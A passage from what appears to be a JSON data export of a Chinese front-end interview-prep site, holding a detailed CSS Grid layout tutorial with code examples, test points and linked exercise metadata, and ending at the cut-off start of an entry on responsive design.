    "explanation": "## Grid 布局是什么？\n\n`Grid` 布局即网格布局，是一种新的 `CSS` 布局模型，比较擅长将一个页面划分为几个主要区域，以及定义这些区域的大小、位置、层次等关系。号称是最强大的的 `CSS` 布局方案，是目前唯一一种 `CSS` 二维布局。利用 `Grid` 布局，我们可以轻松实现类似下图布局，[演示地址](https://codepen.io/gpingfeng/pen/qBbveKB?editors=1100 \"https://codepen.io/gpingfeng/pen/qBbveKB?editors=1100\")\n\n![](https://static.ecool.fun//article/3d278f9d-7465-4b2c-8411-b836de16854e.)\n\n## Grid 布局和 flex 布局\n\n讲到布局，我们就会想到 `flex` 布局，甚至有人认为竟然有 `flex` 布局了，似乎没有必要去了解 `Grid` 布局。但 `flex` 布局和 `Grid` 布局有实质的区别，那就是 **`flex` 布局是一维布局，`Grid` 布局是二维布局**。`flex` 布局一次只能处理一个维度上的元素布局，一行或者一列。`Grid` 布局是将容器划分成了“行”和“列”，产生了一个个的网格，我们可以将网格元素放在与这些行和列相关的位置上，从而达到我们布局的目的。\n\n**`Grid` 布局远比 `flex` 布局强大！**\n\nflex布局示例:\n\n![](https://static.ecool.fun//article/85d5a07d-a25e-42d9-948b-6ee14ff888fa.)\n\nGrid 布局示例：\n\n![Grid 布局](https://static.ecool.fun//article/09492d20-85b7-4e46-aca5-c421469dccde.)\n\n## Grid 的一些基础概念\n\n我们使用 Grid 实现一个小例子，演示 Grid 的一些基础概念，[演示地址](https://codepen.io/gpingfeng/pen/QWyoexm?editors=1100 \"https://codepen.io/gpingfeng/pen/QWyoexm?editors=1100\")\n\n```html\n<div class=\"wrapper\">\n  <div class=\"one item\">One</div>\n  <div class=\"two item\">Two</div>\n  <div class=\"three item\">Three</div>\n  <div class=\"four item\">Four</div>\n  <div class=\"five item\">Five</div>\n  <div class=\"six item\">Six</div>\n</div>\n```\n\n```css\n.wrapper {\n  margin: 60px;\n  /* 声明一个容器 */\n  display: grid;\n  /*  声明列的宽度  */\n  grid-template-columns: repeat(3, 200px);\n  /*  声明行间距和列间距  */\n  grid-gap: 20px;\n  /*  声明行的高度  */\n  grid-template-rows: 100px 200px;\n}\n.one {\n  background: #19CAAD;\n}\n.two { \n  background: #8CC7B5;\n}\n.three {\n  background: #D1BA74;\n}\n.four {\n  background: #BEE7E9;\n}\n.five {\n  background: #E6CEAC;\n}\n.six {\n  background: #ECAD9E;\n}\n.item {\n  text-align: center;\n  font-size: 200%;\n  color: #fff;\n}\n```\n\n![](https://static.ecool.fun//article/994a11f4-549e-446e-b938-de6d82ed8a29.)\n\n容器和项目：我们通过在元素上声明 `display：grid` 或 `display：inline-grid` 来创建一个网格容器。一旦我们这样做，这个元素的所有直系子元素将成为网格项目。比如上面 `.wrapper` 所在的元素为一个网格容器，其直系子元素将成为网格项目。\n\n网格轨道：`grid-template-columns` 和 `grid-template-rows` 属性来定义网格中的行和列。容器内部的水平区域称为行，垂直区域称为列。上图中 `One`、`Two`、`Three` 组成了一行，`One`、`Four` 则是一列\n\n![行和列](https://static.ecool.fun//article/b991f287-3d41-4793-9761-651dcaffe1ef.)\n\n网格单元：一个网格单元是在一个网格元素中最小的单位， 从概念上来讲其实它和表格的一个单元格很像。上图中 `One`、`Two`、`Three`、`Four`...都是一个个的网格单元\n\n网格线：划分网格的线，称为\"网格线\"。应该注意的是，当我们定义网格时，我们定义的是网格轨道，而不是网格线。Grid 会为我们创建编号的网格线来让我们来定位每一个网格元素。m 列有 m + 1 根垂直的网格线，n 行有 n + 1 跟水平网格线。比如上图示例中就有 4 根垂直网格线。一般而言，是从左到右，从上到下，1，2，3 进行编号排序。当然也可以从右到左，从下到上，按照 -1，-2，-3...顺序进行编号排序\n\n![网格线](https://static.ecool.fun//article/51342359-9ca4-40e5-8673-51286ee2fd72.)\n\n## 容器属性介绍\n\n`Grid` 布局相关的属性以及值众多，需要记忆的不少，建议可以跟 `demo` 一起结合起来，边敲代码边理解，再利用一些空闲时间记忆一下。笔者会在介绍每个属性的时候，做个小 `demo` 演示，建议大家可以自己修改看看效果加深记忆\n\n`Grid` 布局属性可以分为两大类，一类是容器属性，一类是项目属性。我们先来看容器属性\n\n### display 属性\n\n[display 属性演示](https://codepen.io/gpingfeng/pen/wvMZwqY \"https://codepen.io/gpingfeng/pen/wvMZwqY\")\n\n我们通过在元素上声明 `display：grid` 或 `display：inline-grid` 来创建一个网格容器。声明 `display：grid` 则该容器是一个块级元素，设置成 `display: inline-grid` 则容器元素为行内元素\n\n```CSS\n.wrapper {\n  display: grid;\n}\n```\n\n![块级元素](https://static.ecool.fun//article/98fa7c08-17f7-472a-b72f-7e724e40d49d.)\n\n```arduino\n.wrapper-1 {\n  display: inline-grid;\n}\n```\n\n![行内属性](https://static.ecool.fun//article/d3fa0f6d-4567-4588-9253-9fcd247fa6ad.)\n\n### grid-template-columns 属性和 grid-template-rows 属性\n\n[grid-template-columns 和 grid-template-rows 属性演示地址](https://codepen.io/gpingfeng/pen/BajEBYq?editors=1100 \"https://codepen.io/gpingfeng/pen/BajEBYq?editors=1100\")\n\n`grid-template-columns` 属性设置列宽，`grid-template-rows` 属性设置行高，这两个属性在 `Grid` 布局中尤为重要，它们的值是有多种多样的，而且它们的设置是比较相似的，下面针对 `grid-template-columns` 属性进行讲解\n\n**固定的列宽和行高**\n\n```css\n.wrapper {\n  display: grid;\n  /*  声明了三列，宽度分别为 200px 100px 200px */\n  grid-template-columns: 200px 100px 200px;\n  grid-gap: 5px;\n  /*  声明了两行，行高分别为 50px 50px  */\n  grid-template-rows: 50px 50px;\n}\n```\n\n以上表示固定列宽为 200px 100px 200px，行高为 50px 50px\n\n![固定行高和列宽](https://static.ecool.fun//article/18de4135-4902-4fdf-8306-47f0187a333a.)\n\n**repeat() 函数**：可以简化重复的值。该函数接受两个参数，第一个参数是重复的次数，第二个参数是所要重复的值。比如上面行高都是一样的，我们可以这么去实现，实际效果是一模一样的\n\n```css\n.wrapper-1 {\n  display: grid;\n  grid-template-columns: 200px 100px 200px;\n  grid-gap: 5px;\n  /*  2行，而且行高都为 50px  */\n  grid-template-rows: repeat(2, 50px);\n}\n```\n\n**auto-fill 关键字**：表示自动填充，让一行（或者一列）中尽可能的容纳更多的单元格。`grid-template-columns: repeat(auto-fill, 200px)` 表示列宽是 200 px，但列的数量是不固定的，只要浏览器能够容纳得下，就可以放置元素，代码以及效果如下图所示：\n\n```CSS\n.wrapper-2 {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, 200px);\n  grid-gap: 5px;\n  grid-auto-rows: 50px;\n}\n```\n\n![image](https://static.ecool.fun//article/00b41a3e-b662-47ff-95b8-66a259fbf4d7.)\n\n**fr 关键字**：`Grid` 布局还引入了一个另外的长度单位来帮助我们创建灵活的网格轨道。`fr` 单位代表网格容器中可用空间的一等份。`grid-template-columns: 200px 1fr 2fr` 表示第一个列宽设置为 200px，后面剩余的宽度分为两部分，宽度分别为剩余宽度的 1/3 和 2/3。代码以及效果如下图所示：\n\n```CSS\n.wrapper-3 {\n  display: grid;\n  grid-template-columns: 200px 1fr 2fr;\n  grid-gap: 5px;\n  grid-auto-rows: 50px;\n}\n```\n\n![image](https://static.ecool.fun//article/bd60fdf4-de7c-4f1d-822d-abb832121ba2.)\n\n**minmax() 函数**：我们有时候想给网格元素一个最小和最大的尺寸，`minmax()` 函数产生一个长度范围，表示长度就在这个范围之中都可以应用到网格项目中。它接受两个参数，分别为最小值和最大值。`grid-template-columns: 1fr 1fr minmax(300px, 2fr)` 的意思是，第三个列宽最少也是要 300px，但是最大不能大于第一第二列宽的两倍。代码以及效果如下：\n\n```css\n.wrapper-4 {\n  display: grid;\n  grid-template-columns: 1fr 1fr minmax(300px, 2fr);\n  grid-gap: 5px;\n  grid-auto-rows: 50px;\n}\n```\n\n![image](https://static.ecool.fun//article/fffc327e-7176-49a0-bb61-d3141ac95ef9.)\n\n**auto 关键字**：由浏览器决定长度。通过 `auto` 关键字，我们可以轻易实现三列或者两列布局。`grid-template-columns: 100px auto 100px` 表示第一第三列为 100px，中间由浏览器决定长度，代码以及效果如下：\n\n```css\n.wrapper-5 {\n  display: grid;\n  grid-template-columns: 100px auto 100px;\n  grid-gap: 5px;\n  grid-auto-rows: 50px;\n}\n```\n\n![image](https://static.ecool.fun//article/abb86405-4fc7-4a2d-a181-b0e4811842a0.)\n\n### grid-row-gap 属性、grid-column-gap 属性以及 grid-gap 属性\n\n[grid-row-gap 属性、grid-column-gap 属性以及 grid-gap 属性演示地址](https://codepen.io/gpingfeng/pen/jOWRNeg \"https://codepen.io/gpingfeng/pen/jOWRNeg\")\n\n`grid-row-gap` 属性、`grid-column-gap` 属性分别设置行间距和列间距。 `grid-gap` 属性是两者的简写形式。\n\n`grid-row-gap: 10px` 表示行间距是 10px，`grid-column-gap: 20px` 表示列间距是 20px。`grid-gap: 10px 20px` 实现的效果是一样的\n\n```CSS\n.wrapper {\n  display: grid;\n  grid-template-columns: 200px 100px 100px;\n  grid-gap: 10px 20px;\n  grid-auto-rows: 50px;\n}\n```\n\n```CSS\n.wrapper-1 {\n  display: grid;\n  grid-template-columns: 200px 100px 100px;\n  grid-auto-rows: 50px;\n  grid-row-gap: 10px;\n  grid-column-gap: 20px;\n}\n```\n\n以上两种写法效果是一样的。\n\n![](https://static.ecool.fun//article/cafd487c-e42c-4fb9-a0b8-fffef6085465.)\n\n### grid-template-areas 属性\n\n[grid-area 以及 grid-template-areas演示地址](https://codepen.io/gpingfeng/pen/RwrObEJ?editors=1100 \"https://codepen.io/gpingfeng/pen/RwrObEJ?editors=1100\")\n\n`grid-template-areas` 属性用于定义区域，一个区域由一个或者多个单元格组成\n\n一般这个属性跟网格元素的 `grid-area` 一起使用，我们在这里一起介绍。 `grid-area` 属性指定项目放在哪一个区域\n\n```CSS\n.wrapper {\n  display: grid;\n  grid-gap: 10px;\n  grid-template-columns: 120px  120px  120px;\n  grid-template-areas:\n    \". header  header\"\n    \"sidebar content content\";\n  background-color: #fff;\n  color: #444;\n}\n```\n\n上面代码表示划分出 6 个单元格，其中值得注意的是 `.` 符号代表空的单元格，也就是没有用到该单元格。\n\n```css\n.sidebar {\n  grid-area: sidebar;\n}\n\n.content {\n  grid-area: content;\n}\n\n.header {\n  grid-area: header;\n}\n```\n\n以上代码表示将类 `.sidebar` `.content` `.header`所在的元素放在上面 `grid-template-areas` 中定义的 `sidebar` `content` `header` 区域中\n\n![](https://static.ecool.fun//article/9c1d4ad6-a5ae-4864-8138-984b6dd22661.)\n\n### grid-auto-flow 属性\n\n[grid-auto-flow 属性演示地址](https://codepen.io/gpingfeng/pen/MWKRWKj?editors=1100 \"https://codepen.io/gpingfeng/pen/MWKRWKj?editors=1100\")\n\n`grid-auto-flow` 属性控制着自动布局算法怎样运作，精确指定在网格中被自动布局的元素怎样排列。默认的放置顺序是\"先行后列\"，即先填满第一行，再开始放入第二行，即下图英文数字的顺序 `one`,`two`,`three`...。这个顺序由 `grid-auto-flow` 属性决定，默认值是 `row`。\n\n```css\n.wrapper {\n  display: grid;\n  grid-template-columns: 100px 200px 100px;\n  grid-auto-flow: row;\n  grid-gap: 5px;\n  grid-auto-rows: 50px;\n}\n```\n\n![](https://static.ecool.fun//article/5f0c6418-425b-4394-b440-30cbd08e650d.)\n\n细心的同学可能发现了一个问题，就是第五个项目和第六个项目之间有个空白（如下图所示），这个是由于第六块的长度大于了空白处的长度，被挤到了下一行导致的。在实际应用中，我们可能想让下面长度合适的填满这个空白，这个时候可以设置 `grid-auto-flow: row dense`，表示尽可能填满表格。代码以及效果如下所示：\n\n![image](https://static.ecool.fun//article/c8ea7de6-a4cb-4e14-8309-9995431cd814.)\n\n```CSS\n.wrapper-2 {\n  display: grid;\n  grid-template-columns: 100px 200px 100px;\n  grid-auto-flow: row dense;\n  grid-gap: 5px;\n  grid-auto-rows: 50px;\n}\n```\n\n![image](https://static.ecool.fun//article/0a914c74-8bc0-47dc-9994-91a00ea0b2c6.)\n\n可以设置 `grid-auto-flow: column`，表示先列后行，代码以及效果如下图所示：\n\n```CSS\n.wrapper-1 {\n  display: grid;\n  grid-auto-columns: 100px;\n  grid-auto-flow: column;\n  grid-gap: 5px;\n  grid-template-rows:  50px 50px;\n}\n```\n\n![image](https://static.ecool.fun//article/db50e87d-6e47-499d-89df-534b01fbd9d4.)\n\n### justify-items 属性、align-items 属性以及 place-items 属性\n\n[justify-items 属性、align-items 属性演示地址](https://codepen.io/gpingfeng/pen/zYrXYrz?editors=1100 \"https://codepen.io/gpingfeng/pen/zYrXYrz?editors=1100\")\n\n`justify-items` 属性设置单元格内容的水平位置（左中右），`align-items` 属性设置单元格的垂直位置（上中下）\n\n下面以 justify-items 属性为例进行讲解，align-items 属性同理，只是方向为垂直方向。它们都有如下属性：\n\n```sql\n.container {\n  justify-items: start | end | center | stretch;\n  align-items: start | end | center | stretch;\n}\n```\n\n其代码实现以及效果如下：\n\n```css\n.wrapper, .wrapper-1, .wrapper-2, .wrapper-3 {\n  display: grid;\n  grid-template-columns: 100px 200px 100px;\n  grid-gap: 5px;\n  grid-auto-rows: 50px;\n  justify-items: start;\n}\n.wrapper-1 {\n  justify-items: end;\n}\n.wrapper-2 {\n  justify-items: center;\n}\n.wrapper-3 {\n  justify-items: stretch;\n}\n```\n\n-   start：对齐单元格的起始边缘\n\n![image](https://static.ecool.fun//article/9d62065a-aa2b-4eba-876f-06c598973201.)\n\n-   end：对齐单元格的结束边缘\n\n![image](https://static.ecool.fun//article/b73feebd-2744-4216-a1bc-04340875c4b2.)\n\n-   center：单元格内部居中\n\n![image](https://static.ecool.fun//article/12990084-fdf8-4ab8-be2f-570093bad38e.)\n\n-   stretch：拉伸，占满单元格的整个宽度（默认值）\n\n![image](https://static.ecool.fun//article/69712949-7edc-4204-b654-7e580362c29a.)\n\n### justify-content 属性、align-content 属性以及 place-content 属性\n\n[justify-content 属性、align-content 属性演示地址](https://codepen.io/gpingfeng/pen/qBbwBZx?editors=1100 \"https://codepen.io/gpingfeng/pen/qBbwBZx?editors=1100\")\n\n`justify-content` 属性是整个内容区域在容器里面的水平位置（左中右），`align-content` 属性是整个内容区域的垂直位置（上中下）。它们都有如下的属性值。\n\n```css\n.container {\n  justify-content: start | end | center | stretch | space-around | space-between | space-evenly;\n  align-content: start | end | center | stretch | space-around | space-between | space-evenly;  \n}\n```\n\n下面以 `justify-content` 属性为例进行讲解，`align-content` 属性同理，只是方向为垂直方向\n\n-   start - 对齐容器的起始边框\n-   end - 对齐容器的结束边框\n-   center - 容器内部居中\n\n```css\n.wrapper, .wrapper-1, .wrapper-2, .wrapper-3, .wrapper-4, .wrapper-5, .wrapper-6 {\n  display: grid;\n  grid-template-columns: 100px 200px 100px;\n  grid-gap: 5px;\n  grid-auto-rows: 50px;\n  justify-content: start;\n}\n.wrapper-1 {\n  justify-content: end;\n}\n.wrapper-2 {\n  justify-content: center;\n}\n```\n\n![image](https://static.ecool.fun//article/b58cd199-5612-4f9e-97fd-2fc87fb53e9f.)\n\n-   space-around - 每个项目两侧的间隔相等。所以，项目之间的间隔比项目与容器边框的间隔大一倍\n-   space-between - 项目与项目的间隔相等，项目与容器边框之间没有间隔\n-   space-evenly - 项目与项目的间隔相等，项目与容器边框之间也是同样长度的间隔\n-   stretch - 项目大小没有指定时，拉伸占据整个网格容器\n\n```css\n.wrapper-3 {\n  justify-content: space-around;\n}\n.wrapper-4 {\n  justify-content: space-between;\n}\n.wrapper-5 {\n  justify-content: space-evenly;\n}\n.wrapper-6 {\n  justify-content: stretch;\n}\n```\n\n![image](https://static.ecool.fun//article/84128957-8a69-45d5-90c4-be94691344c6.)\n\n### grid-auto-columns 属性和 grid-auto-rows 属性\n\n[grid-auto-columns 属性和 grid-auto-rows 属性演示地址](https://codepen.io/gpingfeng/pen/zYrXvYZ?editors=1100 \"https://codepen.io/gpingfeng/pen/zYrXvYZ?editors=1100\")\n\n在讲 `grid-auto-columns` 属性和 `grid-auto-rows` 属性之前，先来看看隐式和显示网格的概念\n\n**隐式和显示网格**：显式网格包含了你在 `grid-template-columns` 和 `grid-template-rows` 属性中定义的行和列。如果你在网格定义之外又放了一些东西，或者因为内容的数量而需要的更多网格轨道的时候，网格将会在隐式网格中创建行和列\n\n假如有多余的网格（也就是上面提到的隐式网格），那么它的行高和列宽可以根据 `grid-auto-columns` 属性和 `grid-auto-rows` 属性设置。它们的写法和 `grid-template-columns` 和 `grid-template-rows` 完全相同。如果不指定这两个属性，浏览器完全根据单元格内容的大小，决定新增网格的列宽和行高\n\n```css\n.wrapper {\n  display: grid;\n  grid-template-columns: 200px 100px;\n/*  只设置了两行，但实际的数量会超出两行，超出的行高会以 grid-auto-rows 算 */\n  grid-template-rows: 100px 100px;\n  grid-gap: 10px 20px;\n  grid-auto-rows: 50px;\n}\n```\n\n`grid-template-columns` 属性和 `grid-template-rows` 属性只是指定了两行两列，但实际有九个元素，就会产生隐式网格。通过 `grid-auto-rows` 可以指定隐式网格的行高为 50px\n\n![](https://static.ecool.fun//article/9aacdcdc-26cb-4c6b-a396-07aff9e79edb.)\n\n## 项目属性介绍\n\n### grid-column-start 属性、grid-column-end 属性、grid-row-start 属性以及grid-row-end 属性\n\n[演示地址](https://codepen.io/gpingfeng/pen/PoZgopr \"https://codepen.io/gpingfeng/pen/PoZgopr\")\n\n可以指定网格项目所在的四个边框，分别定位在哪根网格线，从而指定项目的位置\n\n-   grid-column-start 属性：左边框所在的垂直网格线\n-   grid-column-end 属性：右边框所在的垂直网格线\n-   grid-row-start 属性：上边框所在的水平网格线\n-   grid-row-end 属性：下边框所在的水平网格线\n\n```css\n.wrapper {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr);\n  grid-gap: 20px;\n  grid-auto-rows: minmax(100px, auto);\n}\n.one {\n  grid-column-start: 1;\n  grid-column-end: 2;\n  background: #19CAAD;\n}\n.two { \n  grid-column-start: 2;\n  grid-column-end: 4;\n  grid-row-start: 1;\n  grid-row-end: 2;\n  /*   如果有重叠，就使用 z-index */\n  z-index: 1;\n  background: #8CC7B5;\n}\n.three {\n  grid-column-start: 3;\n  grid-column-end: 4;\n  grid-row-start: 1;\n  grid-row-end: 4;\n  background: #D1BA74;\n}\n.four {\n  grid-column-start: 1;\n  grid-column-end: 2;\n  grid-row-start: 2;\n  grid-row-end: 5;\n  background: #BEE7E9;\n}\n.five {\n  grid-column-start: 2;\n  grid-column-end: 2;\n  grid-row-start: 2;\n  grid-row-end: 5;\n  background: #E6CEAC;\n}\n.six {\n  grid-column: 3;\n  grid-row: 4;\n  background: #ECAD9E;\n}\n```\n\n上面代码中，类 `.two` 所在的网格项目，垂直网格线是从 2 到 4，水平网格线是从 1 到 2。其中它跟 `.three` （垂直网格线是从3 到 4，水平网格线是从 1 到 4） 是有冲突的。可以设置 `z-index` 去决定它们的层级关系\n\n![](https://static.ecool.fun//article/c73eae75-587f-4f4c-8cf6-e09cb5adcc96.)\n\n### grid-area 属性\n\n`grid-area` 属性指定项目放在哪一个区域，在上面介绍 `grid-template-areas` 的时候有提到过，这里不再具体展开，具体的使用可以参考演示地址：\n\n[grid-area 以及 grid-template-areas 属性演示地址](https://codepen.io/gpingfeng/pen/RwrObEJ \"https://codepen.io/gpingfeng/pen/RwrObEJ\")\n\n### justify-self 属性、align-self 属性以及 place-self 属性\n\n[justify-self 属性/ align-self 属性/ place-self 属性演示地址](https://codepen.io/gpingfeng/pen/ZEQZEJK?editors=1100 \"https://codepen.io/gpingfeng/pen/ZEQZEJK?editors=1100\")\n\n`justify-self` 属性设置单元格内容的水平位置（左中右），跟 `justify-items` 属性的用法完全一致，但只作用于单个项目\n\n`align-self` 属性设置单元格内容的垂直位置（上中下），跟align-items属性的用法完全一致，也是只作用于单个项目\n\n两者很相像，这里只拿 `justify-self` 属性演示，`align-self` 属性同理，只是作用于垂直方向\n\n```css\n.item {\n  justify-self: start | end | center | stretch;\n  align-self: start | end | center | stretch;\n}\n```\n\n```css\n.item {\n  justify-self: start;\n}\n.item-1 {\n  justify-self: end;\n}\n.item-2 {\n  justify-self: center;\n}\n.item-3 {\n  justify-self: stretch;\n}\n```\n\n-   start：对齐单元格的起始边缘\n\n![image](https://static.ecool.fun//article/cde96060-e631-4c3f-8d93-2dab3c2fa9b1.)\n\n-   end：对齐单元格的结束边缘\n\n![image](https://static.ecool.fun//article/e1df868a-13e6-4a86-a71b-5c808aa53127.)\n\n-   center：单元格内部居中 ![image](https://static.ecool.fun//article/2cfdd4c7-52ec-407f-89fc-5eacabc9c79f.)\n    \n-   stretch：拉伸，占满单元格的整个宽度（默认值） ![image](https://static.ecool.fun//article/78859b0e-f45a-43fd-a1fb-ede6bc5def7f.)\n    \n\n## Grid 实战——实现响应式布局\n\n经过上面的介绍，相信大家都可以看出，Grid 是非常强大的。一些常见的 CSS 布局，如居中，两列布局，三列布局等等是很容易实现的。我们接下来看看 Grid 布局是如何实现响应式布局的\n\n### fr 实现等分响应式\n\n[fr 实现等分响应式](https://codepen.io/gpingfeng/pen/wvMZKpB?editors=1100 \"https://codepen.io/gpingfeng/pen/wvMZKpB?editors=1100\")\n\n`fr` 等分单位，可以将容器的可用空间分成想要的多个等分空间。利用这个特性，我们能够轻易实现一个等分响应式。`grid-template-columns: 1fr 1fr 1fr` 表示容器分为三等分\n\n```css\n.wrapper {\n  margin: 50px;\n  display: grid;\n  grid-template-columns: 1fr 1fr 1fr;\n  grid-gap: 10px 20px;\n  grid-auto-rows: 50px;\n}\n```\n\n![image](https://static.ecool.fun//article/55624ca5-115b-43d1-a2c3-f96cba893556.)\n\n### repeat + auto-fit——固定列宽，改变列数量\n\n等分布局并不只有 `Grid` 布局才有，像 `flex` 布局也能轻松实现，接下来看看更高级的响应式\n\n上面例子的始终都是三列的，但是需求往往希望我们的网格能够固定列宽，并根据容器的宽度来改变列的数量。这个时候，我们可以用到上面提到 `repeat()` 函数以及 `auto-fit` 关键字。`grid-template-columns: repeat(auto-fit, 200px)` 表示固定列宽为 200px，数量是自适应的，只要容纳得下，就会往上排列，代码以及效果实现如下：\n\n[演示地址](https://codepen.io/gpingfeng/pen/eYJopVE?editors=1100 \"https://codepen.io/gpingfeng/pen/eYJopVE?editors=1100\")\n\n```css\n.wrapper {\n  margin: 50px;\n  display: grid;\n  grid-template-columns: repeat(auto-fit, 200px);\n  grid-gap: 10px 20px;\n  grid-auto-rows: 50px;\n}\n```\n\n![image](https://static.ecool.fun//article/ce66cbd5-e75e-41d7-ba01-4a84055e8f08.)\n\n### repeat+auto-fit+minmax 去掉右侧空白\n\n上面看到的效果中，右侧通常会留下空白，这是我们不希望看到的。如果列的宽度也能在某个范围内自适应就好了。`minmax()` 函数就帮助我们做到了这点。将 `grid-template-columns: repeat(auto-fit, 200px)` 改成 `grid-template-columns: repeat(auto-fit, minmax(200px, 1fr))` 表示列宽至少 200px，如果还有空余则一起等分。代码以及效果如下所示：\n\n[演示地址](https://codepen.io/gpingfeng/pen/dyGLYdQ \"https://codepen.io/gpingfeng/pen/dyGLYdQ\")\n\n```css\n.wrapper {\n  margin: 50px;\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));\n  grid-gap: 10px 20px;\n  grid-auto-rows: 50px;\n}\n```\n\n![auto-auto-minmax.gif](https://static.ecool.fun//article/9a09551c-d8cc-4189-a19b-f60a8b797bff.)\n\n### repeat+auto-fit+minmax-span-dense 解决空缺问题\n\n似乎一切进行得很顺利，但是某天 UI 来说，每个网格元素的长度可能不相同，这也简单，通过 `span` 关键字进行设置网格项目的跨度，`grid-column-start: span 3`，表示这个网格项目跨度为 3。具体的代码与效果如下所示：\n\n```css\n.item-3 {\n  grid-column-start: span 3;\n}\n```\n\n[演示地址](https://codepen.io/gpingfeng/pen/BajEoxy?editors=1100 \"https://codepen.io/gpingfeng/pen/BajEoxy?editors=1100\")\n\n![image](https://static.ecool.fun//article/e3cdeda7-3626-4eb7-821d-80a81aeb5a0d.)\n\n不对，怎么右侧又有空白了？原来是有一些长度太长了，放不下，这个时候就到我们的 `dense` 关键字出场了。`grid-auto-flow: row dense` 表示尽可能填充，而不留空白，代码以及效果如下所示：\n\n```css\n.wrapper, .wrapper-1 {\n  margin: 50px;\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));\n  grid-gap: 10px 20px;\n  grid-auto-rows: 50px;\n}\n\n.wrapper-1 {\n  grid-auto-flow: row dense;\n}\n```\n\n![image](https://static.ecool.fun//article/fc3244bc-2006-435d-ba6b-3845c14dc2c1.)\n",
    "testPoint": "1. **基础概念**：\n   - 理解CSS Grid的基本概念：Grid布局是用于创建二维布局的工具，可以同时管理行和列。\n\n2. **主要属性**：\n   - **容器属性**：\n     - `display: grid;`：将元素设置为网格容器。\n     - `grid-template-columns` 和 `grid-template-rows`：定义列和行的大小以及数量。\n     - `grid-template-areas`：定义一个区域网格，允许为特定区域命名。\n     - `grid-column-gap` 和 `grid-row-gap`：设置列和行的间隙。\n     - `grid-auto-flow`：控制自动创建行或列的方式。\n\n3. **项目属性**：\n   - `grid-column-start`, `grid-column-end`, `grid-row-start`, `grid-row-end`：定义项目在网格内起始和结束的行/列位置。\n   - `grid-area`：简写属性，设置项目占据的区域。\n   - `justify-self` 和 `align-self`：用于控制单个网格项在其单元格中的对齐方式。\n\n4. **网格线和网格单元**：\n   - 理解网格线的概念，以及如何在布局中使用它们来定义位置。\n   - 了解网格单元的概念，并能够针对不同布局需求灵活使用。\n\n5. **自适应与响应式设计**：\n   - 如何使用Grid布局创建响应式设计，使用媒体查询和可自适应的单元格定义。\n\n6. **常见布局模式**：\n   - 使用Grid布局实现常见的布局例如：\n     - 栅格布局\n     - 瀑布流布局\n     - Masonry（拼贴）布局\n     - 多列内容布局\n\n7. **与Flexbox的比较**：\n   - 理解Grid布局与Flexbox布局的区别和适用场景，知道在哪种情况下使用Grid或Flexbox。\n\n8. **层叠上下文与z-index**：\n   - 了解如何在Grid布局中处理层叠上下文和使用`z-index`属性进行堆叠顺序的管理。\n\n9. **浏览器支持与兼容性**：\n   - 了解不同浏览器对Grid布局的支持情况及可能需要的前缀（如`-ms-`）。\n\n10. **实践应用**：\n    - 常见的Grid布局相关面试题，如给定一组元素，如何设定Grid样式达到特定的布局效果。\n\n",
    "exerciseKeyList": "[\"a1d425f5-4d07-4ffc-865b-23fec635032c\",\"e33db22c-e826-41f0-b5a9-33b9a03091bc\",\"9cc69b35-a6f3-466a-8724-7b855b38a1a9\"]",
    "vipLimit": 0,
    "level": 1.5,
    "pointOrder": 11,
    "createAt": "2024-10-08T09:33:36.000Z",
    "updateAt": "2024-11-10T05:42:05.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "9cc69b35-a6f3-466a-8724-7b855b38a1a9",
        "title": "如何实现两栏布局，右侧自适应？三栏布局中间自适应呢？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:22:35.000Z",
        "updateAt": "2024-08-10T19:45:47.000Z"
      },
      {
        "exerciseKey": "a1d425f5-4d07-4ffc-865b-23fec635032c",
        "title": "grid网格布局是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:31:27.000Z",
        "updateAt": "2024-08-10T17:04:26.000Z"
      },
      {
        "exerciseKey": "e33db22c-e826-41f0-b5a9-33b9a03091bc",
        "title": "css 中三栏布局的实现方案有哪些？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:09:48.000Z"
      }
    ]
  },
  "115": {
    "id": 115,
    "tagId": 11,
    "title": "响应式设计",
    "explanation": "## 引言\n\n响应式布局指的是同一页面在不同屏幕尺寸下有不同的布局。传统的开发方式是PC端开发一套，手机端再开发一套，而使用响应式布局只要开发一套就够，缺点就是`CSS`比较重。下面是博客网站对不同设备适配后的结果，分别是`iPhone5/SE`,`iphone6/7/8`,`iphone 6/7/8 plus`,`ipad pro`,`dell台式宽屏(1440 X 900)`。\n\n> 响应式设计与自适应设计的区别：响应式开发一套界面，通过检测视口分辨率，针对不同客户端在客户端做代码处理，来展现不同的布局和内容；自适应需要开发多套界面，通过检测视口分辨率，来判断当前访问的设备是pc端、平板、手机，从而请求服务层，返回不同的页面。\n\n![](https://static.ecool.fun//article/798f337f-8cd2-4965-8147-a3309bd1613c.awebp)\n\n![](https://static.ecool.fun//article/4c20a114-2b22-4657-b361-15bfc2f9d51a.awebp)\n\n![](https://static.ecool.fun//article/a2078bad-7145-4867-bf3c-4ef13c5047ee.awebp)\n\n## 响应式布局的实现方案\n\n### 1\\. 媒体查询\n\n`CSS3`媒体查询可以让我们针对不同的媒体类型定义不同的样式，当重置浏览器窗口大小的过程中，页面也会根据浏览器的宽度和高度重新渲染页面。\n\n#### 